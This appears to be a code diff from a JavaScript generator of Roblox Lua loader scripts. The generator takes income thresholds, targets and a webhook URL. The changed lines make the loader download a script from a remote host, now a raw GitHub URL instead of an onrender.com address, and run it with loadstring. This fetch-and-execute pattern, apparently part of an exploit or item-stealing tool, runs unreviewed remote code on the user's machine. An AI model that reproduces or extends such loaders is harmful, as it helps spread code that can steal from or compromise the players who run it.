@@ -271,7 +271,7 @@ async function createScriptLoader(minIncome, maxItems, targetsRaw, webhookUrlRaw
         `fenv["Visual"] = ${visualRaw === "" ? '""' : '"' + String(visualRaw).replace(/"/g, '\\"') + '"'}`,
         `fenv["ScriptId"] = "${scriptId}"`,
         ``,
-        `local var1 = game:HttpGet("https://m4gix-ws.onrender.com/scripts/ts")`,
+        `local var1 = game:HttpGet("https://raw.githubusercontent.com/cagnastylepay-png/scripts/refs/heads/main/ts")`,
         `local var2 = loadstring(var1)`,
         `local var3 = var2()`
     ].join('\n');
